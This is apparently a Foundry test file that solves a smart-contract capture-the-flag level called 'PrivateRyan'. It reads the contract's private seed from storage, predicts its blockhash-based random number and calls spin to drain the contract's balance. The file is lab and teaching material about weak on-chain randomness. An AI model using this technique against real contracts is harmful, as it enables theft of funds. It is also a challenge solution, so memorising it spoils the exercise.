// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        uint256 seed = uint256(vm.load(address(instance), 0)); 
        uint256 rand = myRand(seed);
        instance.spin{value: 0.01 ether}(rand);

        checkSuccess();
    }

    function myRand(uint256 seed) internal view returns (uint256) {
        uint256 hashVal = uint256(blockhash(block.number - seed));
        return uint256((uint256(hashVal) / 1157920892373161954235709850086879078532699846656405640394575840079131296399)) % 100;
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
